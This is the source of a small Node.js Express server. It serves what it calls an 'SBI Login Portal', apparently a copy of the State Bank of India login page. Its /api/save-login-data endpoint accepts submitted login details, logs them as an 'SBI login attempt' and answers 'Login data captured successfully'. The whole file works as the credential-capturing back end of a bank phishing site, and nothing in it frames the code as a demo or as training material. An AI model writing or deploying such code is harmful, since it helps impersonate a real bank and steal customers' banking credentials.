const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3002;

// Middleware
app.use(express.json());
app.use(express.static(__dirname)); // Serve static files from current directory

// Serve HTML files
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/index', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Handle form submissions
app.post('/api/save-login-data', (req, res) => {
    try {
        const loginData = req.body;
        console.log('📝 SBI login attempt:', loginData);
        
        res.json({ 
            success: true, 
            message: 'Login data captured successfully' 
        });
    } catch (error) {
        console.error('Error processing login data:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to process login data' 
        });
    }
});

// Error handling
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ error: 'Something went wrong!' });
});

// 404 handler
app.use((req, res) => {
    res.status(404).sendFile(path.join(__dirname, 'index.html'));
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 SBI Login Portal Server running on http://localhost:${PORT}`);
    console.log(`📱 Access the portal at: http://localhost:${PORT}`);
    console.log(`\n✨ Press Ctrl+C to stop the server`);
});